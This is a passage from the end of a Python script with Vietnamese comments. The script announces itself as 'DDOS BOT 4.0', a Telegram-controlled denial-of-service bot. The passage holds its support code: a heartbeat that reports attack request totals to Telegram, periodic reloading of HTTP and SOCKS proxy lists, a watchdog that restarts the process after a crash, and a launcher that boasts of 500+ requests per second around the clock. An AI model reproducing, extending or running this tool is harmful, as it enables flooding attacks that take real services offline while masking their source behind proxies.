# HEARTBEAT - GIỮ BOT SỐNG
# =====================================================
def heartbeat_loop():
    """Heartbeat giữ bot sống và thông báo định kỳ"""
    global heartbeat_count
    
    while True:
        time.sleep(60)
        heartbeat_count += 1
        
        # Heartbeat mỗi 30 phút
        if heartbeat_count % 30 == 0:
            with stats_lock:
                total = attack_stats['total_requests']
                uptime = int(time.time() - bot_start_time)
                uptime_str = f"{uptime//3600}h{(uptime%3600)//60}m{uptime%60}s"
            
            send_telegram(f"""
❤️ <b>HEARTBEAT #{heartbeat_count}</b>
⏱ Uptime: {uptime_str}
📨 Tổng req: {total:,}
🌐 HTTP:{len(proxy_http)} S5:{len(proxy_socks5)} S4:{len(proxy_socks4)}
⚡ Tốc độ cài: {REQUESTS_PER_SECOND} req/s
🧵 Luồng: {THREAD_COUNT}
📌 Status: {'🟢 RUNNING' if is_running else '🔴 IDLE'}
            """)

# =====================================================
# TỰ ĐỘNG RELOAD PROXY
# =====================================================
def auto_reload_proxy():
    """Tự động reload proxy từ file mỗi 10 phút"""
    global proxy_http, proxy_socks5, proxy_socks4, proxy_list, proxy_update_time
    
    while True:
        time.sleep(600)  # 10 phút
        
        if os.path.exists("proxies.txt"):
            http, socks5, socks4 = load_proxies("proxies.txt")
            total = len(http) + len(socks5) + len(socks4)
            
            if total > 0:
                proxy_http = http
                proxy_socks5 = socks5
                proxy_socks4 = socks4
                proxy_list = http + socks5 + socks4
                proxy_update_time = time.time()
                
                # Thông báo nếu có thay đổi
                if total > 0:
                    send_telegram(f"🔄 Tự động reload proxy: HTTP:{len(http)} S5:{len(socks5)} S4:{len(socks4)}")

# =====================================================
# WATCHDOG - TỰ ĐỘNG RESTART
# =====================================================
def watchdog():
    """Giám sát và tự động restart nếu crash"""
    while True:
        time.sleep(60)
        # Kiểm tra luồng chính
        active = threading.active_count()
        if active < 3:
            send_telegram("⚠️ WATCHDOG: PHÁT HIỆN CRASH! ĐANG RESTART...")
            time.sleep(3)
            try:
                os.execv(sys.executable, [sys.executable] + sys.argv)
            except:
                pass

# =====================================================
# KHỞI CHẠY CHÍNH
# =====================================================
if __name__ == "__main__":
    # Lưu thời gian khởi động
    bot_start_time = time.time()
    
    # Tải proxy
    proxy_file = "proxies.txt"
    if os.path.exists(proxy_file):
        proxy_http, proxy_socks5, proxy_socks4 = load_proxies(proxy_file)
        proxy_list = proxy_http + proxy_socks5 + proxy_socks4
        proxy_update_time = time.time()
        print(f"[+] Đã tải proxy: HTTP={len(proxy_http)} SOCKS5={len(proxy_socks5)} SOCKS4={len(proxy_socks4)}")
    else:
        print("[+] Chưa có file proxies.txt")
        # Tạo file mặc định
        with open("proxies.txt", 'w') as f:
            f.write("# Proxy list - ip:port\n")
            f.write("# Example: 192.168.1.1:8080\n")
            f.write("# Example: socks5://user:pass@1.2.3.4:1080\n")
    
    print("="*60)
    print("🔥 DDOS BOT 4.0 - TỐI ƯU TỐI ĐA")
    print("="*60)
    print(f"[+] Token: {TELEGRAM_BOT_TOKEN[:15]}...")
    print(f"[+] HTTP: {len(proxy_http)} | SOCKS5: {len(proxy_socks5)} | SOCKS4: {len(proxy_socks4)}")
    print(f"[+] Tổng proxy: {len(proxy_list)}")
    print(f"[+] Luồng: {THREAD_COUNT}")
    print(f"[+] Tốc độ: {REQUESTS_PER_SECOND} req/s")
    print(f"[+] Max run: {MAX_RUN_TIME}s")
    print("="*60)
    print("[+] BOT ĐÃ SẴN SÀNG - CHẠY 24/7")
    print("[+] TỐC ĐỘ TỐI ĐA 500+ REQ/S")
    print("[+] HỖ TRỢ HTTP, SOCKS4, SOCKS5")
    print("="*60)
    
    # Khởi chạy các thread
    threading.Thread(target=telegram_listener, daemon=True).start()
    threading.Thread(target=heartbeat_loop, daemon=True).start()
    threading.Thread(target=auto_reload_proxy, daemon=True).start()
    threading.Thread(target=watchdog, daemon=True).start()
    
    # Giữ chương trình chạy
    try:
        while True:
            time.sleep(3600)
    except KeyboardInterrupt:
        send_telegram("⛔ Bot đã dừng bởi người dùng.")
        print("[+] Bot đã dừng.")
